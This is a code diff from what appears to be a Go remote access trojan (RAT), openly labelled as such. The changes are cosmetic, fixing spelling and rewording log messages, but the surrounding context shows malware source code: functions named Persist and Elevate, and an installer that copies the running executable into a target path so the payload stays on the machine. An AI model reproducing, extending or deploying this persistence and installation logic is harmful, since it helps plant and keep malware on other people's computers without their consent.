@@ -18,11 +18,11 @@ func SetupDaemon() {
 	go Persist(PathExe)
 }
 
-// installExecuteable copys the currently running executeable
+// installExecuteable copies the currently running executeable
 // TODO: Remove duplicate source payload once RAT is installed
 func installExecuteable() error {
 	if err := os.RemoveAll(Path); err != nil {
-		log.Println("[InstallExe] [!] Could NOT clear executeable path:", err)
+		log.Println("[InstallExe] [!] Couldn't clear executeable path:", err)
 		return err
 	}
 
@@ -34,17 +34,17 @@ func installExecuteable() error {
 
 	data, err := ioutil.ReadFile(ex)
 	if err != nil {
-		log.Println("[InstallExe] [!] Could not read current exe:", err)
+		log.Println("[InstallExe] [!] Couldn't read current exe:", err)
 		return err
 	}
 
 	if err = os.MkdirAll(Path, os.ModePerm); err != nil {
-		log.Println("[InstallExe] [!] Could not create path for new exe:", err)
+		log.Println("[InstallExe] [!] Couldn't create path for new exe:", err)
 		return err
 	}
 
 	if err = ioutil.WriteFile(PathExe, data, os.ModePerm); err != nil {
-		log.Println("[InstallExe] [!] Could not write exe to path:", err)
+		log.Println("[InstallExe] [!] Couldn't write exe to path:", err)
 		return err
 	}
 
@@ -59,7 +59,7 @@ func Elevate() error {
 
 	err := installExecuteable()
 	if err != nil {
-		return errors.New("[Elevate] [!] Could NOT copy payload into target path")
+		return errors.New("[Elevate] [!] Couldn't copy payload into target path")
 	}
 	log.Println("[Elevate] [+] Successfully copied payload into target path")
 
